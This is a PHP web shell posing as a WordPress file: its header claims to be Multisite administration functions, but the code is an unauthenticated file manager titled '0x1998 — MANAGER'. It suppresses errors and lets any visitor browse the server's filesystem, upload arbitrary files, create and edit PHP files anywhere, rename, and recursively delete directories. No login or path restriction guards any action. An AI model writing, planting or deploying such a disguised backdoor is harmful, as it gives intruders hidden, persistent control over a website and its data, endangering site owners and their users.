<?php
/**
 * Multisite administration functions.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.0.0
 */

error_reporting(0);
@set_time_limit(0);

// ── Helper ──
function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

function fmt_size($bytes) {
    if (!$bytes) return '0 B';
    $u = ['B','KB','MB','GB','TB','PB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $u[$i];
}

function safe_path($p) {
    $p = str_replace('\\', '/', $p);
    $r = realpath($p);
    return $r ?: getcwd();
}

function rmrf($path) {
    if (is_dir($path) && !is_link($path)) {
        foreach (scandir($path) as $f) {
            if ($f === '.' || $f === '..') continue;
            rmrf($path . '/' . $f);
        }
        return @rmdir($path);
    }
    return @unlink($path);
}

// ── Init ──
$path = isset($_GET['path']) ? safe_path($_GET['path']) : getcwd();
$msg  = '';

// ── Actions ──
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Upload file
    if (isset($_POST['upload_file']) && !empty($_FILES['file_to_upload']['name'])) {
        $target = rtrim($path, '/') . '/' . basename($_FILES['file_to_upload']['name']);
        $msg = @move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $target)
            ? "[OK] Uploaded: " . h(basename($target))
            : "[ERR] Upload failed";
    }

    // Create folder
    if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
        $name = basename($_POST['folder_name']);
        $new  = rtrim($path, '/') . '/' . $name;
        $msg  = @mkdir($new) ? "[OK] Folder created: " . h($name) : "[ERR] Failed to create folder";
    }

    // Create file
    if (isset($_POST['create_file']) && !empty($_POST['new_file_name'])) {
        $name = basename($_POST['new_file_name']);
        $new  = rtrim($path, '/') . '/' . $name;
        if (file_exists($new)) {
            $msg = "[ERR] File already exists";
        } else {
            $msg = @file_put_contents($new, '') !== false
                ? "[OK] File created: " . h($name)
                : "[ERR] Failed to create file";
        }
    }

    // Save edited file
    if (isset($_POST['save_file']) && isset($_POST['file_content']) && isset($_POST['file_path'])) {
        $fp = $_POST['file_path'];
        $msg = @file_put_contents($fp, $_POST['file_content']) !== false
            ? "[OK] Saved: " . h(basename($fp))
            : "[ERR] Save failed";
    }
}

// Delete file/folder
if (isset($_GET['delete'])) {
    $del = safe_path($_GET['delete']);
    if ($del && is_writable(dirname($del)) || is_writable($del)) {
        $msg = rmrf($del) ? "[OK] Deleted: " . h(basename($del)) : "[ERR] Delete failed";
    } else {
        $msg = "[ERR] Not writable";
    }
}

// Rename
if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old = rtrim($path, '/') . '/' . basename($_POST['old_name']);
    $new = rtrim($path, '/') . '/' . basename($_POST['new_name']);
    $msg = @rename($old, $new) ? "[OK] Renamed" : "[ERR] Rename failed";
}

// ── Edit mode ──
$editing = false; $edit_file = ''; $edit_content = '';
if (isset($_GET['action']) && $_GET['action'] === 'edit' && isset($_GET['file'])) {
    $edit_file = rtrim($path, '/') . '/' . basename($_GET['file']);
    if (is_file($edit_file)) {
        $editing = true;
        $edit_content = file_get_contents($edit_file);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?= h(basename($path)) ?: '/' ?> — Manager</title>
<style>
    * { box-sizing: border-box; }
    body { font-family: -apple-system, 'Segoe UI', monospace; background:#0d1117; color:#c9d1d9; margin:0; padding:20px; }
    #container { max-width: 1100px; margin: 0 auto; }
    h1 { color:#58a6ff; font-size:20px; margin:0 0 10px; }
    h2, h3 { color:#79c0ff; font-size:15px; margin:20px 0 8px; }
    a { color:#58a6ff; text-decoration:none; }
    a:hover { text-decoration:underline; }
    .msg { padding:8px 12px; background:#161b22; border-left:3px solid #58a6ff; margin:10px 0; font-size:13px; border-radius:4px; }
    .msg.err { border-color:#f85149; }
    ul { list-style:none; padding:0; margin:0; }
    li { padding:6px 10px; border-bottom:1px solid #21262d; display:flex; justify-content:space-between; align-items:center; font-size:13px; }
    li:hover { background:#161b22; }
    li .meta { color:#8b949e; font-size:11px; }
    li .actions a { margin-left:8px; font-size:12px; }
    li .actions a.del { color:#f85149; }
    hr { border:0; border-top:1px solid #30363d; margin:20px 0; }
    input[type=text], textarea { background:#0d1117; color:#c9d1d9; border:1px solid #30363d; padding:6px 8px; border-radius:4px; font-family:monospace; font-size:13px; }
    input[type=text] { width:100%; max-width:400px; }
    textarea { width:100%; min-height:300px; }
    input[type=submit], button { background:#238636; color:#fff; border:0; padding:6px 14px; border-radius:4px; cursor:pointer; font-size:13px; margin-top:6px; }
    input[type=submit]:hover, button:hover { background:#2ea043; }
    .row { display:flex; gap:20px; flex-wrap:wrap; }
    .box { flex:1; min-width:280px; background:#161b22; padding:14px; border-radius:6px; border:1px solid #30363d; }
    .crumb { font-size:12px; color:#8b949e; margin-bottom:10px; }
    .crumb a { color:#58a6ff; }
</style>
</head>
<body>
<div id="container">
    <h1>0x1998 — MANAGER</h1>
    <div class="crumb">📂 <?= $path ?></div>

    <?php if ($msg): ?>
        <div class="msg <?= strpos($msg, '[ERR]') === 0 ? 'err' : '' ?>"><?= $msg ?></div>
    <?php endif; ?>

    <?php if ($editing): ?>
        <h2>✏️ Edit: <?= h(basename($edit_file)) ?></h2>
        <form method="post">
            <input type="hidden" name="file_path" value="<?= h($edit_file) ?>">
            <textarea name="file_content"><?= h($edit_content) ?></textarea>
            <input type="submit" name="save_file" value="💾 Save">
            <a href="?path=<?= urlencode($path) ?>" style="margin-left:10px;font-size:13px;">← Back</a>
        </form>

    <?php else: ?>

        <h3>📁 Contents</h3>
        <ul>
        <?php
        $items = @scandir($path);
        if ($items):
            if ($path !== dirname($path)) {
                $parent = urlencode(dirname($path));
                echo '<li>📁 <a href="?path=' . $parent . '">.. (parent)</a></li>';
            }
            foreach ($items as $item):
                if ($item === '.' || $item === '..') continue;
                $full = rtrim($path, '/') . '/' . $item;
                $is_dir = is_dir($full);
                $size = $is_dir ? '' : fmt_size(@filesize($full));
        ?>
            <li>
                <span>
                    <?= $is_dir ? '📁' : '📄' ?>
                    <?php if ($is_dir): ?>
                        <a href="?path=<?= urlencode($full) ?>"><?= h($item) ?></a>
                    <?php else: ?>
                        <a href="?action=edit&path=<?= urlencode($path) ?>&file=<?= urlencode($item) ?>"><?= h($item) ?></a>
                    <?php endif; ?>
                </span>
                <span class="meta">
                    <?= $size ?>
                    <span class="actions">
                        <a href="?action=rename&path=<?= urlencode($path) ?>&old=<?= urlencode($item) ?>">rename</a>
                        <a class="del" href="?path=<?= urlencode($path) ?>&delete=<?= urlencode($full) ?>" onclick="return confirm('Delete <?= h($item) ?> ?')">delete</a>
                    </span>
                </span>
            </li>
        <?php endforeach; endif; ?>
        </ul>

        <hr>

        <div class="row">
            <div class="box">
                <h3>📤 Upload File</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="file_to_upload" style="color:#c9d1d9;">
                    <input type="submit" name="upload_file" value="Upload">
                </form>
            </div>

            <div class="box">
                <h3>📝 Create File</h3>
                <form method="post">
                    <input type="text" name="new_file_name" placeholder="nama_file.php" required>
                    <input type="submit" name="create_file" value="Create">
                </form>
            </div>

            <div class="box">
                <h3>📁 Create Folder</h3>
                <form method="post">
                    <input type="text" name="folder_name" placeholder="nama_folder" required>
                    <input type="submit" name="create_folder" value="Create">
                </form>
            </div>
        </div>

        <?php
        // Rename form
        if (isset($_GET['action']) && $_GET['action'] === 'rename' && isset($_GET['old'])):
            $old = $_GET['old'];
        ?>
        <hr>
        <h3>✏️ Rename: <?= h($old) ?></h3>
        <form method="post">
            <input type="hidden" name="old_name" value="<?= h($old) ?>">
            <input type="text" name="new_name" value="<?= h($old) ?>" required>
            <input type="submit" name="rename" value="Rename">
        </form>
        <?php endif; ?>

    <?php endif; ?>
</div>
</body>
</html>
